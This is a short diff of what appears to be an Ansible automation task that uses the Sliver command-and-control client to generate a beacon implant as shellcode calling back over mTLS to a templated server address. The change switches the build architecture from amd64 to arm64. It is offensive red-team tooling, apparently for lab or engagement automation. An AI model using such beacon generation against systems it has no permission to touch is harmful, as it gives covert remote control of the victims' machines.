@@ -87,7 +87,7 @@
         cmd: |
           sliver-client --connect {{ sliver_server_ip }}:{{ sliver_server_port }} --skip-update <<EOF
           use beacon
-          generate beacon --mtls {{ sliver_server_ip }}:{{ sliver_server_port }} --arch amd64 --format shellcode --name {{ beacon_name }}
+          generate beacon --mtls {{ sliver_server_ip }}:{{ sliver_server_port }} --arch arm64 --format shellcode --name {{ beacon_name }}
           exit
           EOF
         chdir: /tmp
